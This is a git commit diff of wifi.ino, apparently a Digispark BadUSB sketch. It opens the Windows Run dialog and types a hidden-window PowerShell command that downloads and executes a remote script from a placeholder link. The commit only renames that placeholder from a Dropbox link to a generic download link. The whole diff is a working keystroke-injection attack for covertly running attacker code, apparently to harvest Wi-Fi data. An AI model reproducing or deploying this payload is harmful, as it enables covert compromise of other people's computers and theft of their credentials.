73dd94dfc32686784247c2fa5d13987d847e370e
exploitechx <45520349+exploitechx@users.noreply.github.com>
2018-12-02 02:05:34 +0530

    Update wifi.ino

--- wifi.ino
+++ wifi.ino
@@ -18,7 +18,7 @@ void setup()
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(300);
   
-  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('YOUR-DROPBOX-LINK-WIFI.PS1');\""));
+  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('YOUR-DOWNLOAD-LINK-WIFI.PS1');\""));
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
